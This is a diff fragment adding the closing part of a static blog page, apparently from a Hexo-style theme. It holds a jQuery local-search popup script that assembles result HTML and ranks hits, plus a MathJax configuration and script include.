+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              } else {
+                resultItem += "<a target='_blank' href='" + articleUrl + "' class='search-result'><div class='search-result-left'><div class='search-result-title'>" + title + "</div><time class='search-result-date'>" + dateTime + "</time>";
+              }
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<p class=\"search-result-content\">" + highlightKeyword(content, slice) + "...</p>";
+              });
+              resultItem += "</div><div class='search-result-right'><img class='media-image' src='" + imgUrl + "' width='64px' height='48px'></img></div></a>";
+
+              resultItems.push({item: resultItem, searchTextCount: searchTextCount, hitCount: hitCount, id: resultItems.length});
+            }
+          })
+        };
+
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<div class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</div>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+      // remove loading animation
+      $('body').css('overflow', '');
+      proceedsearch();
+    }
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function (e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function (e) {
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 && $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+
+    document.addEventListener('mouseup', (e) => {
+      var _con = document.querySelector(".local-search-content");
+      if (_con) {
+        if (!_con.contains(e.target)) {
+          onPopupClose();
+        }
+      }
+    });
+  </script>
+
+
+		
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
